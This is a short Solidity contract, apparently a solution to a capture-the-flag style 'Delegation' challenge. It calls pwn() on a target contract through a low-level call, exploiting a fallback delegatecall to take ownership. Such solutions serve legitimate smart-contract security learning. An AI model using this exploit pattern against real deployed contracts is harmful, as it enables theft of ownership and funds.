// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Delegation delegation = Delegation(contractAddress);
        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success);
    }
}
